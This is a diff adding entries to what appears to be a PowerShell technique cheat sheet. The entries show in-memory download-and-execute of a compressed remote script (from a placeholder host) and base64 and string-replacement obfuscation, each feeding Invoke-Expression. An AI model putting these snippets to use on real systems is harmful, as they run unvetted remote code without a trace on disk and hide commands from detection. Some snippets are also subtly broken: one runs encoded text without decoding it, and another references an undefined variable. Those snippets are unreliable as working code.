@@ -81,4 +81,26 @@
 `Import-Module BitsTransfer`  
 `Start-BitsTransfer -Source $url -Destination "script.ps1"`  
 `Invoke-Expression -Command (Get-Content -Path "script.ps1" -Raw)`  
-
+\# Remote Code Execution - Code Compression / Decompression (run script from memory)  
+`$url = "https://site.com/script.ps1.gz"`  
+`$compressed = (New-Object System.Net.WebClient).DownloadData($url)`  
+`$stream = New-Object IO.MemoryStream`  
+`$stream.Write($compressed, 0, $compressed.Length)`  
+`$stream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null`  
+`$gzip = New-Object IO.Compression.GzipStream($stream,[IO.Compression.CompressionMode]::Decompress)`  
+`$reader = New-Object IO.StreamReader($gzip)`  
+`$script = $reader.ReadToEnd()`  
+`Invoke-Expression $script`  
+\# Code Obfuscation - base64 Encoding  
+`$text = "Test encoded text"`  
+`$bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`  
+`$encoded =[Convert]::ToBase64String($bytes)`  
+`Invoke-Expression $encoded`  
+\# Code Obfuscation - base64 Decoding  
+`$encoded = "VABlAHMAdAAgAGUAbgBjAG8AZABlAGQAIAB0AGUAeAB0AA=="`  
+`$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))`  
+`Invoke-Expression $decoded`  
+\# Code Obfuscation - Characters Replacement  
+`$obfuscated = "abcdef-ghijkl 'Test text'"`  
+`$command = $obfuscatedCommand -replace 'abcdef', 'Write' -replace 'ghijkl', 'Output'`  
+`Invoke-Expression $command`  
